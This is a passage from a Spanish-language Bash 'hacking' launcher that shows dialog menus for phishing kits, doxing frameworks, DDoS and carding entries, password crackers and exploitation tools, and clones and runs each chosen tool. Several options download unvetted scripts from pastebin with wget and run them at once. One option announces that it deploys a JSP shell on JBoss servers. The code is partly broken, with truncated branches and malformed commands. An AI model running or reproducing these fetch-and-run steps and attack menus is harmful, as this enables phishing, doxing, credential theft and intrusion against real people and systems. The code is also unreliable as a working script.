cd DoxTracker
python2 DoxTracker.py
          elif [[ $doxeos == 8 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/doxing/
git clone https://github.com/brut0s/DFW
python2 Doxing-Framework.py 
         elif [[ $doxeos == 9 ]]; then
menu_principal
 else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac


}

function mis_phishing(){
Phishing=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PIRATERIA HACKING" \
    --menu "" 15 51 20 \
    1 "FotoSploit." \
    2 "Nahfer-Phishing." \
    3 "Blackeye." \
    4 "SocialSploit." \
    5 "Weeman" \
    6 "Phise"\
    7 "HiddenEye"\
    8 "Phisher-man"\
    9 "Shell-Phish"\
    10 "Black-Phish"\
    11 "AdvPhishing"\
    12 "Phishing-Ops"\
    13 "PhishX"\
    14 "NexPhisher"\
    15 "PhishMailer"\
    16 "zphisher")

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $Phishing == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/Cesar-Hack-Gray/FotoSploit
cd FotoSploit
bash install.sh
./FotoSploit 
        elif [[ $Phishing == 2 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
nahfer
        elif [[ $Phishing == 3 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/thelinuxchoice/blackeye
cd blackeye
bash blackeye.sh
        elif [[ $Phishing == 4 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/Cesar-Hack-Gray/SocialSploit
cd SocialSploit
bash install.sh
./Sploit
        elif [[ $Phishing == 5 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/evait-security/weeman
cd weeman
python2 weeman.py
        elif [[ $Phishing == 6 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/yezz123/Phisher
cd Phisher
bash Phisher.sh
      elif [[ $Phishing == 7 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
https://github.com/yevgen2020/HiddenEye
cd HiddenEye
python2 HiddenEye.py
      elif [[  $Phishing == 8 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/FDX100/Phisher-man.git
cd Phisher-man
python phisherman.py
      elif [[ $Phishing == 9 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/thelinuxchoice/shellphish
cd shellphish
bash shellphish.sh
      elif [[ $Phishing == 10 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/iinc0gnit0/BlackPhish
cd BlackPhish
python3 blackphish.py
      elif [[ $Phishing == 11 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/Ignitetch/AdvPhishing.git
cd AdvPhishing
chmod 777 *
./Linux-Setup.sh
./AdvPhishing.sh
      elif [[ $Phishing == 12 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/hackeropsmx/Phishing-Ops
cd Phishing-Ops
bash PhishingOps.sh
      elif [[ $Phishing == 13 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/WeebSec/PhishX.git
cd PhishX
chmod +x installer.sh
bash installer.sh
python3 PhishX.py
      elif [[ $Phishing == 14 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone git://github.com/htr-tech/nexphisher.git
cd nexphisher
bash nexphisher
        elif [[ $Phishing == 15 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://www.github.com/BiZken/PhishMailer.git
cd PhishMailer
chmod +x PhishMailer.py
python3 PhishMailer.py
        elif [[ $Phishing == 16 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/phishing
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
bash zphisher.sh
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}

function universal1() {
inicio=$(dialog --backtitle "NAHFER HACKING" --stdout --title "HACKING." \
    --menu "" 23 51 23 \
    1 "Ingenieria Social" \
    2 "Hackeo a Fuerza Bruta" \
    3 "Web craping" \
    4 "Ataques DDOS" \
    5 "Carding." \
    6 "Doxing" \
    7 "Recopilación de información" \
    8 "Ataques de contraseña" \
    9 "Prueba inalámbrica" \
    10 "Herramientas de explotación" \
    11 "Sniffing & Spoofing" \
    12 "Piratería web" \
    13 "Piratería web privada" \
    14 "Post explotación"\
    15 "Prueba de estrés"\
   16 "Olfateo y suplantación de identidad" \
   17 "Mantenimiento del acceso" \
   18 "Herramientas de seguimiento de IP" \
   19 "Ataques DDOS" \
   20 "Servidor web" \
   21 "Herramientas forenses" \
   22 "Escáner de vulnerabilidades" )
chosen=$?

case $chosen in
    0)
        echo $(clear)
         if [[ $inicio == 1 ]]; then
mi_funcion
        elif [[ $inicio == 2 ]]; then
mi_funcion_jaja
        elif [[ $inicio == 3 ]]; then
web_craping
        elif [[ $inicio == 4 ]]; then
ataques_ddos
        elif [[ $inicio == 5 ]]; then
carding 
        elif [[ $inicio == 6 ]]; then
mi_doxing
        elif  [[ $inicio == 7 ]]; then
universal2
        elif [[ $inicio == 8 ]]; then
universal3
        elif [[ $inicio == 9 ]]; then
universal4
        elif [[ $inicio == 10 ]]; then
universal5
        elif [[ $inicio == 11 ]]; then
universal6
        elif [[ $inicio == 12 ]]; then
universal7
 else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function universal2() {
# funciones
source $HOME/Central-Nahfer/.config/.functiones/functiones
recopilacion_de_informacion
	doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "Information Gathering." \
    --menu "" 25 51 68 \
    1 "Asignador de red Nmap" \
    2 "Setoolkit" \
    3 "Host a IP" \
    4 "WPScan" \
    5 "CMSmap" \
    6 "XSStrike" \
    7 "Doork" \
    8 "DFW" \
    9 "Crips." \
    10 "Automater" \
    11 "Crips" \
    12 "D-TECT"\
    13 "Devploit" \
    14 "EvilURL" \
    15 "EyeWitness" \
    16 "IP-FY" \
    17 "IP-Tracer" \
    18 "InSpy" \
    19  "Infoga" \
    20 "OSIF" \
    21 "Parsero" \
    22 "RED_HAWK" \
    23 "ReconDog" \
    24 "SET" \
    25 "Sublist3r" \
    26 "WAScan" \
    27  "apt2" \
    28 "arp-scan" \
    29  "bing-ip2hosts" \
    30 "braa" \
    31 "cdpsnarf" \
    32 "dmitry" \
    33  "dnsenum" \
    34 "dnsmap" \
    35  "dnsrecon" \
    36  "doork" \
    37  "dotdotpwn" \
    38  "enum4linux" \
    39  "faraday" \
    40  "fierce" \
    41 "firewalk" \
    42  "fragrouter" \
    43   "fragroute" \
    44  "ghost-phisher" \
    45 "golismero" \
    46  "goofile" \
    47 "iSMTP" \
    48 "intrace" \
    49  "masscan" \
    50  "nikto" \
    51  "nmap" \
    52 "osrframework" \
    53  "recon-ng"\
    54  "smbmap"\
    55  "social-engineer-toolkit"\
    56 "sqlmap"\
    57  "sqlmate"\
    58 "sqlscan"\
    59 "sslcaudit"\
    60 "sslsplit"\
    61 "sslstrip"\
    62 "sslyze"\
    63 "thc-ipv6"\
    64 "theHarvester"\
    65 "trackout"\
    66 "a-xex")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        
        if [[ $doxeos == 1 ]]; then
$clone $git1
cogit1
        elif [[ $doxeos == 2 ]]; then
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd setoolkit
pip3 install -r requirements.txt
python setup.py
        elif [[ $doxeos == 3 ]]; then
$clone $git3
cogit3
        elif [[ $doxeos == 4 ]]; then
universal1
        elif [[ $doxeos == 5 ]]; then
git clone https://github.com/Dionach/CMSmap.git
cd CMSmap
pip3 install .
python  cmsmap.py https://example.com
         elif [[ $doxeos == 6 ]]; then
git clone https://github.com/UltimateHackers/XSStrike.git
pip3 install -r requiements.txt
xsstrike.py
         elif [[ $doxeos == 7 ]]; then
git clone https://github.com/AeonDave/doork.git
         elif [[ $doxeos == 8 ]]; then
universal1
          elif [[ $doxeos == 9 ]]; then
git clone https://github.com/Manisso/Crips.git
 elif [[ $doxeos == 10 ]]; then
$clone $git10
cogit10
 elif [[ $doxeos == 11 ]]; then
$clone $git11
cogit11
elif [[ $doxeos == 12 ]]; then
$clone $git12
cogit12
 elif [[ $doxeos == 13 ]]; then
$clone $git13
cogit13
 elif [[ $doxeos == 14 ]]; then
$clone $git14
cogit14
 elif [[ $doxeos == 15 ]]; then
$clone $git15
cogit15
 elif [[ $doxeos == 16 ]]; then
$clone $git16
cogit16
 elif [[ $doxeos == 17 ]]; then
$clone $git17
cogit17
 elif [[ $doxeos == 18 ]]; then
$clone $git18
cogit18
 elif [[ $doxeos == 19 ]]; then
$clone $git19
cogit19
 elif [[ $doxeos == 20 ]]; then
$clone $git20
cogit20
 elif [[ $doxeos == 21 ]]; then
$clone $git21
cogit21
 elif [[ $doxeos == 22 ]]; then
$clone $git22
cogit22
 elif [[ $doxeos == 23 ]]; then
$clone $git23
cogit23
 elif [[ $doxeos == 24 ]]; then
$clone $git24
cogit24
 elif [[ $doxeos == 25 ]]; then
$clone $git25
cogit25
 elif [[ $doxeos == 26 ]]; then
$clone $git26
cogit26
 elif [[ $doxeos == 27 ]]; then
$clone $git27
cogit27
 elif [[ $doxeos == 28 ]]; then
$clone $git28
cogit28
 elif [[ $doxeos == 29 ]]; then
$clone $git29
cogit29
 elif [[ $doxeos == 30 ]]; then
$clone $git30
cogit30
 elif [[ $doxeos == 31 ]]; then
$clone $git31
cogit31
 elif [[ $doxeos == 32 ]]; then
$clone $git32
cogit32
 elif [[ $doxeos == 33 ]]; then
$clone $git33
cogit33
 elif [[ $doxeos == 34 ]]; then
$clone $git34
cogit34
 elif [[ $doxeos == 35 ]]; then
$clone $git35
cogit35
 elif [[ $doxeos == 36 ]]; then
$clone $git36
cogit36
 elif [[ $doxeos == 37 ]]; then
$clone $git37
cogit37
 elif [[ $doxeos == 38 ]]; then
$clone $git38
cogit38
 elif [[ $doxeos == 39 ]]; then
$clone $git39
cogit39
 elif [[ $doxeos == 40 ]]; then
$clone $git40
cogit40
 elif [[ $doxeos == 41 ]]; then
$clone $git41
cogit41
 elif [[ $doxeos == 42 ]]; then
$clone $git42
cogit42
 elif [[ $doxeos == 43 ]]; then
$clone $git43
cogit43
 elif [[ $doxeos == 44 ]]; then
$clone $git44
cogit44
 elif [[ $doxeos == 45 ]]; then
$clone $git45
cogit45
 elif [[ $doxeos == 46 ]]; then
$clone $git46
cogit46
 elif [[ $doxeos == 47 ]]; then
$clone $git47
cogit47
 elif [[ $doxeos == 48 ]]; then
$clone $git48
cogit48
 elif [[ $doxeos == 49 ]]; then
$clone $git49
cogit49
 elif [[ $doxeos == 50 ]]; then
$clone $git50
cogit50
 elif [[ $doxeos == 51 ]]; then
$clone $git51
cogit51
 elif [[ $doxeos == 52 ]]; then
$clone $git52
cogit52
 elif [[ $doxeos == 53 ]]; then
$clone $git53
cogit53
 elif [[ $doxeos == 54 ]]; then
$clone $git54
cogit54
 elif [[ $doxeos == 55 ]]; then
$clone $git55
cogit55
 elif [[ $doxeos == 56 ]]; then
$clone $git56
cogit56
 elif [[ $doxeos == 57 ]]; then
$clone $git57
cogit57
 elif [[ $doxeos == 58 ]]; then
$clone $git58
cogit58
 elif [[ $doxeos == 59 ]]; then
$clone $git59
cogit59
 elif [[ $doxeos == 60 ]]; then
$clone $git60
cogit60
 elif [[ $doxeos == 61 ]]; then
$clone $git61
cogit61
 elif [[ $doxeos == 62 ]]; then
$clone $git62
cogit62
 elif [[ $doxeos == 63 ]]; then
$clone $git63
cogit63
 elif [[ $doxeos == 64 ]]; then
$clone $git64
cogit64
 elif [[ $doxeos == 65 ]]; then
$clone $git65
cogit65
 elif [[ $doxeos == 66 ]]; then
$clone $git66
cogit66



 else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}

function universal3(){
doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "PASSWORD ATACK." \
    --menu "" 15 51 6 \
    1 "Generador de listas de contraseñas" \
    2 "Cupp - Generador de perfiles de contraseñas de usuario común". \
    3 "BruteX: fuerza bruta automáticamente se ejecutan en un objetivo". \
    4 "CeWL" \
    5 "Hash-Buster" \
    6 "JohnTheRipper" \
    7 "JTRE" \
    8 "SET" \
    9 "SecLists" \
    10 "SocialFish" \
    11 "creddump" \
    12 "crowbar" \
    13 "findmyhash" \
    14 "hash-generator" \
    15 "hashcat" \
    16 "hasherdotid" \
    17 "hasher" \
    18 "hydra" \
    19 "johnny" \
    20 "keimpx" \
    21 "maskprocessor" \
    22 "patator" \
    23 "social-engineer-toolkit" \
    24 "Volver atras")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        
        if [[ $doxeos == 1 ]]; then
cd $HOME/Central-Nahfer/datos/scripts/doxing/DoxTracker
        elif [[ $doxeos == 2 ]]; then
git clone https://github.com/Mebus/cupp.git
python %s/cupp.py -i
        elif [[ $doxeos == 3 ]]; then
git clone https://github.com/1N3/BruteX.git
cd BruteX
         elif [[ $doxeos == 4 ]]; then
         universal1
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function universal4(){
doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "Wireless Testing." \
    --menu "" 15 51 9 \
    1 "reaver." \
    2 "pixiewps" \
    3 "Bluetooth Honeypot GUI Framework" \
    4 "Volver atras.")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $doxeos == 0 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/Wireless_Testing
git clone
        elif [[ $doxeos == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/Wireless_Testing
git clone https://github.com/t6x/reaver-wps-fork-t6x.git
cd reaver-wps-fork-t6x.git
        elif [[ $doxeos == 2 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/Wireless_Testing
git clone https://github.com/nxxxu/AutoPixieWps.git
cd AutoPixieWps
        elif [[ $doxeos == 3 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/Wireless_Testing
wget -O - https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz | tar xfz -
sudo java -jar BluePot-0.1.jar
         elif [[ $doxeos == 4 ]]; then
         universal1
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function universal5(){
doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "Exploitation Tools." \
    --menu "" 15 70 99 \
    1 "ATSCAN." \
    2 "sqlmap" \
    3 "Shellnoob." \
    4 "commix." \
    5 "Anulación automática de FTP". \
    6 "JBoss-Autopwn". \
    7 "Inyección y explotación automática de SQL ciego". \
    8 "Fuerza bruta el código de acceso de Android dado el hash y sal". \
    9 "Escáner de inyección SQL de Joomla". \
    10 "A-Rat"\
    11 "Brutal"\
    12 "ExploitOnCLI"\
    13 "Meterpreter_Paranoid_Mode-SSL"\
    14 "SET"\
    15 "WebXploiter"\
    16 "XAttacker"\
    17 "beef"\
    18 "blackbox"\
    19 "crackle"\
    20 "exploitdb"\
    21 "metasploit-framework"\
    22 "msfpc"\
    23 "routersploit"\
    24 "roxysploit"\
    25 "shellnoob"\
    26 "sqlmap"\
    27 "thc-ipv"\
    28 "the-backdoor-factory"\
    29 "txtool"\
    30 "websploit"\
    31 "xerosploit"\
    32 "yersinia"\
    33 "a-xex"\
    34 "Reverse Shell Factory"\
    35 "Volver atras.")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $doxeos == 0 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
        elif [[ $doxeos == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
$clone $exgit1
        elif [[ $doxeos == 2 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
$clone $exgit2
echo "usage: python sqlmap.py -h"
python sqlmap.py -h
        elif [[ $doxeos == 3 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
git clone https://github.com/reyammer/shellnoob.git
mv shellnoob/shellnoob.py shellnoob.py
python shellnoob.py
         elif [[ $doxeos == 4 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
      git clone https://github.com/stasinopoulos/commix.git commix
      cd commix
      python commix.py
         elif [[ $doxeos == 5 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py
python gabriel.py
         elif [[ $doxeos == 6 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
git clone https://github.com/SpiderLabs/jboss-autopwn.git
echo "This JBoss script deploys a JSP shell on the target JBoss AS server. Once
deployed, the script uses its upload and command execution capability to 
provide an interactive session."
echo
echo "usage: ./e.sh target_ip tcp_port"
         elif [[ $doxeos == 7 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl
echo "ESCRIBE UNA URL"
read -p "-->" url
perl bsqlbf.pl $url
         elif [[ $doxeos == 8 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
git clone https://github.com/PentesterES/AndroidPINCrack.git
echo "Enter the android hash:"
read hash
echo "Enter the android salt: "
read salt
cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s $hash $salt
         elif [[ $doxeos == 9 ]]; then
cd $HOME/Central-Nahfer/.config/datos/scripts/exploitation_tools
wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py
echo "target:"
read target
python cms.py $target
         elif [[ $doxeos == 10 ]]; then
            universal1
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function universal6(){
doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "Sniffing & Spoofing." \
    --menu "" 15 70 9 \
    1 "SEToolkit - Herramienta de penetración entorno ala ingeniería social" \
    2 "SSLtrip: herramienta MITM que implementa ataques de eliminación de SSL" \
    3 "pyPISHER - Herramienta para crear un sitio web malicioso para el rastreo de contraseñas" \
    4 "SMTP Mailer - Herramienta para enviar correo SMTP" \
    5 "KnockMail" \
    6 "Responder" \
    7 "SET" \
    8 "SocialBox" \
    9 "SocialFish" \
    10 "Spammer-Email" \
    11 "Spammer-Grab" \
    12 "bettercap" \
    13 "dnschef" \
    14 "mitmproxy" \
    15 "santet-online" \
    16 "sipvicious" \
    17 "sniffjoke" \
    18 "social-engineer-toolkit" \
    19 "sslstrip" \
    20 "xspy" \
    21 "Volver atras")
chosen=$?

case $chosen in
    0)
        echo $(clear)
        

          if [[ $doxeos == 1 ]]; then
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
python setup.py install
setoolkit
        elif [[ $doxeos == 2 ]]; then
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
apt-get install python-twisted-web
python sslstrip/setup.py
SSlStrip
        elif [[ $doxeos == 3 ]]; then
wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py
python pisher.py
         elif [[ $doxeos == 4 ]]; then
wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py
python smtp.py
         elif [[ $doxeos == 5 ]]; then
         universal1
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function universal7(){
doxeos=$(dialog --backtitle "NAHFER HACKING" --stdout --title "WEB HACKING." \
    --menu "" 30 70 12 \
    1 "Hackeo de Drupal". \
    2 "Inurlbr." \
    3 "Escáner de Wordpress y Joomla". \
    4 "Escáner de forma por gravedad". \
    5 "Comprobador de carga de archivos". \
    6 "Escáner de vulnerabilidades de Wordpress" \
    7 "Escáner de complementos de Wordpress" \
    8 "Buscador de shell y directorios" \
    9 "Joomla! 1.5 - 3.4.5 ejecución remota de código" \
   10 "Ejecución remota de código vbulletin.X" \
   11 "BruteX: fuerza bruta automática de todos los servicios que se ejecutan en un objetivo" \
   12 "Arachni - Marco de análisis de seguridad de aplicaciones web" \
   13  "Breacher" \
   14  "BruteX" \
   15  "PadBuster" \
   16 "SCANNER-INURLBR" \
   17  "SHLL" \
   18  "WAScan" \
   19  "WP-plugin-scanner" \
   20  "WebScarab" \
   21  "WebXploiter" \
   22  "WhatWeb" \
   23  "XAttacker" \
   24  "XPL-SEARCH" \
   25  "XSStrike" \
   26  "Xshell" \
   27  "admin-panel-finder" \
   28  "commix" \
   29  "deblaze" \
   30  "doork" \
   31  "gobuster" \
   32  "hURL" \
   33  "joomscan" \
   34  "plecost" \
   35  "proxystrike" \
   36  "skipfish" \
   37  "smap" \
   38  "sqliv" \
   39  "sqlmap" \
   40  "sqlmate" \
   41  "sqlscan" \
   42  "waf" \
   43  "webdav" \
   44  "websploit" \
   45  "wfuzz" \
   46  "wpscan" \
   47  "xsser" \
   48 "zaproxy" \
   49 "a-xex" \
   50 "Reverse Shell Factory")

chosen=$?

case $chosen in
    0)
        echo $(clear)

        if [[ $doxeos == 1 ]]; then
universal2
        elif [[ $doxeos == 2 ]]; then
universal3
        elif [[ $doxeos == 3 ]]; then
universal4
        elif [[ $doxeos == 4 ]]; then
universal5
        elif [[ $doxeos == 5 ]]; then
universal6

 else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}

function universal8(){
menuhack=$(dialog --backtitle "NAHFER HACKING" --stdout --title "HERRAMIENTAS FORENSES" \
    --menu "" 15 51 6 \
    1 "RegRipper."
    2 "binwalk."
    3 "bulk_extractor."
    4 "capstone."
    5 "cuckoo."
    6 "distorm."
    7 "dumpzilla."
    8 "extundelete."
    9 "foremost."
    10 "pf."
    11 "pdf-parser."
    12 "volatility."
    13 "xplico."
    14 "Volver atras" )
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $menuhack == 0 ]]; then
cd $HOME/Central-Nahfer/datos/.Nahfer-Hacking2
bash info.sh
        elif [[ $menuhack == 1 ]]; then
principio
        elif [[ $menuhack == 2 ]]; then
 echo "esta opcion no esta disponible por el momento"
            echo "muy pronto"
            menu_inicio
        elif [[ $menuhack == 3 ]]; then
cd $HOME/Central-Nahfer/datos/.Nahfer-Hacking2
bash Herramientas.sh
        elif [[ $menuhack == 4 ]]; then
mi_ajustes
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}

function universal9(){
menuxd=$(dialog --backtitle "NAHFER HACKING" --stdout --title "CENTRO" \
    --menu "" 15 51 6 \
    0 "Info" \
    1 "Mundo Hacking." \
    2 "Mundo Sistemas" \
    3 "Herramientas" \
    4 "Ajustes" )
chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $menuxd == 0 ]]; then
cd $HOME/Central-Nahfer/datos/.Nahfer-Hacking2
bash info.sh
        elif [[ $menuxd == 1 ]]; then
principio
        elif [[ $menuxd == 2 ]]; then
 echo "esta opcion no esta disponible por el momento"
            echo "muy pronto"
            menu_inicio
        elif [[ $menuxd == 3 ]]; then
cd $HOME/Central-Nahfer/datos/.Nahfer-Hacking2
bash Herramientas.sh
        elif [[ $menuxd == 4 ]]; then
mi_ajustes
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
function locales-tools(){
herramientastools=$(dialog --stdout --help-button --item-help \
        --ok-label "Select" --cancel-label "Exit" \
        --backtitle "Nahfer-Hacking" \
        --title "Herramientas" \
        --menu "Version $version" 15 51 6 \
        "1" "Crear-Paginas-web    [ Pag-Creator     ]" "Herramienta que te permite Crear una pagina web" \
        "2" "Programador bash     [ Programa-bash   ]" "Herramienta que te permite crear un script en bash scripting" \
        "3" "Programador python   [ Programa-python ]" "Herramienta que te permite crear un script en python" )

chosen=$?

case $chosen in
    0)
        echo $(clear)
        if [[ $herramientastools == 1 ]]; then
cd $HOME/Central-Nahfer/.config/datos/local-tools/pag-creator
bash pag-creador.sh
        elif [[ $herramientastools == 2 ]]; then
principio
cd $HOME/Central-Nahfer/.config/datos/local-tools
        elif [[ $herramientastools == 3 ]]; then
principio
cd $HOME/Central-Nahfer/.config/datos/local-tools
        else
            echo "exit"
            exit 0
        fi
        ;;
    1)
        echo "cancelado .."
        ;;
    255)
        echo ""
        echo $(clear);exit 1
        ;;

esac
}
############################################################################
if [[ -f GZ7/.CS07/security/.sec ]]; then
    source GZ7/.CS07/security/.sec
else
    file_not_found ".sec"
fi
let try=1
while :
do
PASSWORD01=$($DIALOG --ok-label "Log In" --colors --extra-button --extra-label "About" --backtitle "\Zr$program_name - v$version\Zn Club Secreto 07" \
                    --clear --title "[$USERNAME]" --insecure --passwordbox "Password:" 10 55 3>&1 1>&2 2>&3)

case $? in
    0)
        if [[ "$PASSWORD01" == "$PASSWRD" ]]; then
            let try=0
            break

        else
            $DIALOG --backtitle "$program_name - Security" \
                    --colors --title "[SECURITY]" \
                    --msgbox "¡Acceso denegado! (try $try-3)\n\n\Z1\Zr[INCORRECT]:\Zn PASSWORD" 8 41

            if [ $try = 3 ]; then
                ANSWER02=$($DIALOG --stdout --backtitle "$program_name - Pregunta De Seguridad" \
                        --title "[QUESTION]" \
                        --cancel-label "Exit" \
                        --ok-label "Submit" \
                        --inputbox "$QUESTION" 10 55)
                QUEST=$?
                case $QUEST in
                    0)
                        if [[ "$ANSWER" == "$ANSWER02" ]]; then
                            let try=0
                            principio
                        else
                            echo $(clear)
                            echo -e "${R}Respuesta incorrecta.${W}"
                            echo ""
                            exit 1
                        fi
                        ;;
                    1)
                        echo $(clear)
                        echo "Exiting ..."
                        exit 0
                        ;;
                    255)
                        echo $(clear)
                        echo "Program aborted." >&2
                        exit 1
                        ;;
                esac
            else
                let  try=$(($try+1))
            fi
        fi
        ;;
    1)
        echo $(clear)
        echo "Exiting ..."
        exit 0
        ;;
    3)
        $DIALOG --backtitle "$program_name" \
                --title "ABOUT" \
                --textbox "GZ7/.CS07/about" 12 51
        ;;
    255)
        echo $(clear)
        echo "Program aborted." >&2
        exit 1
        ;;
esac
done

internet_connection

principio
